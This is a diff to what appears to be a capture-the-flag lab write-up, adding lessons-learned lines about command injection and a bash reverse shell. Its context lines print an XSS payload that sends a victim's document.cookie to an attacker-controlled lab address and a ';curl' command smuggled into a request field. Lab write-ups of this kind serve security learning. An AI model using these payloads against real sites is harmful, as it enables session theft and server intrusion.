@@ -7,7 +7,8 @@
 ## Lessons Learned:
 - Identifying XSS vulnerability.
 - Steal admin cookie.
-- 
+- Identifying Command Injection vulnerability.
+- Get reverse shell using bash execution.
 
 ## STEPS:
 > PORT SCANNING
@@ -163,7 +164,7 @@ and still execute the code but not alert.
 
 12. Let's try to manipulate the message with not URL encoded XSS payload, for the last check I drop the simple cookie stealing payload.
 
-```js
+```txt
 <img src=err onerror=fetch('http://10.10.14.64:1337/'+document.cookie);>
 ```
 
@@ -194,7 +195,7 @@ and still execute the code but not alert.
 18. We can try to identify the vuln using burpsuite by intercept the request for system check at certain date and executes curl to our local file.
 19. For example I tried to create a random file named --> "test_file", then intercept the request using burpsuite and add this command:
 
-```
+```txt
 ;curl http://10.10.14.64:1337/test_file
 ```
 
